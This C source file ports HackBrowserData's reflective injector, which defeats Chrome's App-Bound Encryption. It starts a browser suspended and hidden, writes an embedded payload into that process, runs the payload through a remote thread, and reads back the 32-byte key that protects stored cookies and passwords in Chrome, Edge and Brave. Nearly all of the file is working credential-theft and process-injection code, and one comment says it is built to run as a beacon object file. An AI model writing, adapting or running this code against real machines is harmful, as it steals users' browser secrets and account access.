/* bd_inject.c - Chrome App-Bound Encryption (v20) key retrieval.
 *
 * The elevation_service (IElevator::DecryptData) only accepts calls from a
 * legitimate browser process, so we spawn a suspended browser, reflectively
 * inject the abe_extractor payload (built from HackBrowserData's
 * crypto/windows/abe_native/*.c), have it call IElevator from inside the
 * browser, and read the 32-byte App-Bound key back from a scratch region.
 *
 * Port of HackBrowserData utils/injector/reflective_windows.go +
 * masterkey/abe_windows.go. Payload embedded via core/abe_payload.h.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"
#include "abe_payload.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memset(void *, int, size_t);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    memcmp(const void *, const void *, size_t);
extern int    _snprintf(char *, size_t, const char *, ...);

typedef struct {
    ULONG_PTR scratch_base;
    ULONG_PTR LoadLibraryA;
    ULONG_PTR GetProcAddress;
    ULONG_PTR VirtualAlloc;
    ULONG_PTR VirtualProtect;
    ULONG_PTR NtFlushInstructionCache;
} BootstrapParams;

#define SCRATCH_KEY_STATUS  0x29   /* byte: 0x01 = READY                    */
#define SCRATCH_ERR_CODE    0x2A
#define SCRATCH_HRESULT     0x2C   /* uint32                                 */
#define SCRATCH_COMERR      0x30   /* uint32                                 */
#define SCRATCH_KEY_OFFSET  0x40   /* 32 bytes                               */

/* ----------------------------------------------------- PE export lookup -- */
/* IMAGE_EXPORT_DIRECTORY is already defined by winnt.h (via windows.h). */

static const unsigned char *rva_to_ptr(const unsigned char *base, DWORD rva,
                                       const IMAGE_SECTION_HEADER *sec, int nsec,
                                       DWORD *lenLeft) {
    int i;
    for (i = 0; i < nsec; i++) {
        DWORD va = sec[i].VirtualAddress;
        DWORD vs = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (rva >= va && rva < va + vs) {
            DWORD off = rva - va;
            if (off < sec[i].SizeOfRawData) {
                if (lenLeft) *lenLeft = sec[i].SizeOfRawData - off;
                return base + sec[i].PointerToRawData + off;
            }
        }
    }
    return NULL;
}

/* return the FILE OFFSET of the "Bootstrap" export in the embedded payload */
static DWORD find_bootstrap_fileoff(void) {
    const unsigned char *p = abe_payload;
    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER *)p;
    const IMAGE_NT_HEADERS *nt;
    const IMAGE_SECTION_HEADER *sec;
    const IMAGE_EXPORT_DIRECTORY *ed;
    const ULONG *names, *funcs;
    const USHORT *ords;
    int nsec, i;

    if (abe_payload_len < sizeof(IMAGE_DOS_HEADER)) return 0;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > abe_payload_len) return 0;
    nt = (const IMAGE_NT_HEADERS *)(p + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    sec = IMAGE_FIRST_SECTION(nt);
    nsec = nt->FileHeader.NumberOfSections;

    ed = (const IMAGE_EXPORT_DIRECTORY *)rva_to_ptr(p,
        nt->OptionalHeader.DataDirectory[0].VirtualAddress, sec, nsec, NULL);
    if (!ed) return 0;
    names = (const ULONG *)rva_to_ptr(p, ed->AddressOfNames, sec, nsec, NULL);
    funcs = (const ULONG *)rva_to_ptr(p, ed->AddressOfFunctions, sec, nsec, NULL);
    ords  = (const USHORT *)rva_to_ptr(p, ed->AddressOfNameOrdinals, sec, nsec, NULL);
    if (!names || !funcs || !ords) return 0;

    for (i = 0; i < (int)ed->NumberOfNames; i++) {
        const char *nm = (const char *)rva_to_ptr(p, names[i], sec, nsec, NULL);
        if (nm && memcmp(nm, "Bootstrap", 9) == 0) {
            DWORD fnRVA = funcs[ords[i]];
            /* convert fnRVA back to file offset */
            return (DWORD)(rva_to_ptr(p, fnRVA, sec, nsec, NULL) - p);
        }
    }
    return 0;
}

/* ------------------------------------------------------ process injection -- */
static int abe_inject(const char *exePath, const char *appbB64, unsigned char keyOut[32]) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD bsOff, old;
    LPVOID remoteBase = NULL, scratchBase = NULL, paramsBase = NULL;
    BootstrapParams bp;
    HANDLE hThread;
    int rc = -1, i;

    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    SetEnvironmentVariableA("HBD_ABE_ENC_B64", appbB64);

    if (!CreateProcessA(exePath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return -1;
    }

    bsOff = find_bootstrap_fileoff();
    if (!bsOff) goto out;

    remoteBase = VirtualAllocEx(pi.hProcess, NULL, abe_payload_len,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBase) goto out;
    if (!WriteProcessMemory(pi.hProcess, remoteBase, abe_payload, abe_payload_len, NULL))
        goto out;
    if (!VirtualProtectEx(pi.hProcess, remoteBase, abe_payload_len, PAGE_EXECUTE_READ, &old))
        goto out;
    FlushInstructionCache(pi.hProcess, remoteBase, abe_payload_len);

    scratchBase = VirtualAllocEx(pi.hProcess, NULL, 0x100,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!scratchBase) goto out;

    /* BootstrapParams: scratch ptr + 5 resolved helper fns */
    memset(&bp, 0, sizeof(bp));
    bp.scratch_base = (ULONG_PTR)scratchBase;
    bp.LoadLibraryA = (ULONG_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    bp.GetProcAddress = (ULONG_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    bp.VirtualAlloc = (ULONG_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    bp.VirtualProtect = (ULONG_PTR)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
    bp.NtFlushInstructionCache = (ULONG_PTR)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFlushInstructionCache");
    if (!bp.LoadLibraryA || !bp.GetProcAddress || !bp.VirtualAlloc ||
        !bp.VirtualProtect || !bp.NtFlushInstructionCache) goto out;

    paramsBase = VirtualAllocEx(pi.hProcess, NULL, sizeof(bp),
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!paramsBase) goto out;
    if (!WriteProcessMemory(pi.hProcess, paramsBase, &bp, sizeof(bp), NULL)) goto out;

    hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)((BYTE *)remoteBase + bsOff),
                                 paramsBase, 0, NULL);
    if (!hThread) goto out;

    /* wait up to ~30s for the payload to publish the key */
    for (i = 0; i < 300; i++) {
        BYTE status = 0;
        SIZE_T rd = 0;
        if (ReadProcessMemory(pi.hProcess, (BYTE *)scratchBase + SCRATCH_KEY_STATUS,
                              &status, 1, &rd) && status == 0x01)
            break;
        Sleep(100);
    }
    {
        BYTE status = 0; SIZE_T rd = 0;
        ReadProcessMemory(pi.hProcess, (BYTE *)scratchBase + SCRATCH_KEY_STATUS, &status, 1, &rd);
        if (status == 0x01) {
            ReadProcessMemory(pi.hProcess, (BYTE *)scratchBase + SCRATCH_KEY_OFFSET,
                              keyOut, 32, &rd);
            rc = 0;
        }
    }
    CloseHandle(hThread);

out:
    TerminateProcess(pi.hProcess, 1);
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return rc;
}

/* ------------------------------------------------------- exe path lookup -- */
/* registry App Paths: HKLM\...\App Paths\<exe>.exe -> default value */
static int app_path(const char *exeName, char *out, size_t cap) {
    HKEY hk = NULL;
    char key[300], val[600];
    DWORD sz = (DWORD)cap, type = 0;
    int rc = -1;
    /* dynamic (BOF-friendly) advapi32 */
    HMODULE adv = LoadLibraryA("advapi32.dll");
    if (!adv) return -1;
    {
        LONG (WINAPI *fnOpen)(HKEY, LPCSTR, DWORD, DWORD, PHKEY) =
            (void *)GetProcAddress(adv, "RegOpenKeyExA");
        LONG (WINAPI *fnQuery)(HKEY, LPCSTR, DWORD, LPDWORD, LPBYTE, LPDWORD) =
            (void *)GetProcAddress(adv, "RegQueryValueExA");
        LONG (WINAPI *fnClose)(HKEY) = (void *)GetProcAddress(adv, "RegCloseKey");
        if (!fnOpen || !fnQuery || !fnClose) { FreeLibrary(adv); return -1; }
        _snprintf(key, sizeof(key),
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\%s", exeName);
        if (fnOpen(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hk) == 0) {
            if (fnQuery(hk, NULL, 0, &type, (LPBYTE)val, &sz) == 0 && sz > 0 && sz <= cap) {
                memcpy(out, val, sz); out[sz - 1] = 0;
                rc = 0;
            }
            fnClose(hk);
        }
    }
    FreeLibrary(adv);
    return rc;
}

/* map browser key -> vendor exe basename (for IElevator CLSID selection) */
static const char *abe_exe_name(const char *key) {
    if (bd_str_ieq(key, "edge")) return "msedge.exe";
    if (bd_str_ieq(key, "brave")) return "brave.exe";
    if (bd_str_ieq(key, "coccoc")) return "browser.exe";
    return "chrome.exe";
}

/* ------------------------------------------------------------ public API -- */
/* Read app_bound_encrypted_key from Local State, resolve the browser exe,
 * reflectively inject the payload, return the 32-byte App-Bound key. */
int bd_abe_get_key(const char *browserKey, const char *localStatePath,
                   unsigned char keyOut[32]) {
    char *data = NULL; size_t dlen = 0;
    bd_json *j;
    const bd_json *ak;
    unsigned char *raw = NULL; size_t rawlen = 0, blobLen;
    char exe[600], appbB64[1400];
    DWORD b64len = 0;
    int rc = -1;

    if (bd_read_file(localStatePath, &data, &dlen) != 0) return -1;
    j = bd_json_parse(data, dlen);
    free(data);
    if (!j) return -1;
    ak = bd_json_path(j, "os_crypt.app_bound_encrypted_key");
    if (!ak || !bd_json_str(ak)) { bd_json_free(j); return -1; }

    if (bd_base64_decode(bd_json_str(ak), strlen(bd_json_str(ak)), &raw, &rawlen) != 0 ||
        rawlen <= 4 || memcmp(raw, "APPB", 4) != 0) {
        if (raw) free(raw);
        bd_json_free(j);
        return -1;
    }
    blobLen = rawlen - 4;
    /* base64-encode the APPB-stripped blob for the payload's env var */
    {
        HMODULE c32 = LoadLibraryA("crypt32.dll");
        if (!c32) { free(raw); bd_json_free(j); return -1; }
        {
            BOOL (WINAPI *fn)(const BYTE *, DWORD, DWORD, LPSTR, DWORD *) =
                (void *)GetProcAddress(c32, "CryptBinaryToStringA");
            if (!fn) { FreeLibrary(c32); free(raw); bd_json_free(j); return -1; }
            fn(raw + 4, (DWORD)blobLen, 0x00000001 /*CRYPT_STRING_BASE64*/, NULL, &b64len);
            if (b64len + 1 > sizeof(appbB64)) { FreeLibrary(c32); free(raw); bd_json_free(j); return -1; }
            fn(raw + 4, (DWORD)blobLen, 0x00000001, appbB64, &b64len);
        }
        FreeLibrary(c32);
    }
    free(raw);
    bd_json_free(j);

    if (app_path(abe_exe_name(browserKey), exe, sizeof(exe)) != 0) return -1;

    rc = abe_inject(exe, appbB64, keyOut);
    SetEnvironmentVariableA("HBD_ABE_ENC_B64", NULL);
    return rc;
}
